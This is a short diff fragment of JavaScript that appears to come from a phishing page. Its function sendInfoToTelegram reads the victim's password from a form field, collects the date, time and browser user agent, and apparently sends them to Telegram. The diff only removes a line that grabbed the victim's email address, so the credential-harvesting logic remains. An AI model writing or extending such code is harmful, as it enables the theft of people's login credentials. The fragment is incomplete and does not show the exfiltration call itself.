@@ -140,7 +140,6 @@ document.addEventListener("DOMContentLoaded", async function() {
     }
 
     async function sendInfoToTelegram() {
-        const email = document.getElementById('email-text').textContent;
         const password = passwordInput.value;
         const { formattedDate, formattedTime } = getFormattedDateAndTime();
         const userAgent = navigator.userAgent;
